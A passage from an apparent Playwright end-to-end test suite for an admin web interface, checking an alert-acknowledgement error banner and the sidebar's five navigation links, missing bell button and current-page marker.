        await expect.poll(() => mock.calls.filter((c) => c.path === "/alerts/40000000-0000-4000-8000-0000000000b2/ack").length).toBeGreaterThan(0);
        await expect(page.getByText(errText(lang, "service_unavailable"))).toBeVisible();
        await expect(stack).toContainText(A("alerts.sms_down.title"));
        // The button is still there to try again.
        await expect(stack.getByRole("button", {name: shellText(lang, "banners.dismiss")})).toBeVisible();
      });
    });

    test("the sidebar has the five pages and no bell, and the current page is marked", async ({page, context, baseURL}) => {
      await openAdmin(context, baseURL);
      await goto(page, "/audit", A("pages.audit.title"));
      const nav = page.locator("aside.sidebar");
      for (const id of ["users", "invites", "sms", "settings", "audit"]) await expect(nav.getByText(A(`nav.${id}`), {exact: true})).toBeVisible();
      await expect(page.getByRole("button", {name: shellText(lang, "bell.label")})).toHaveCount(0);
      await expect(nav.locator('[data-current="true"]')).toContainText(A("nav.audit"));
    });
  });
}
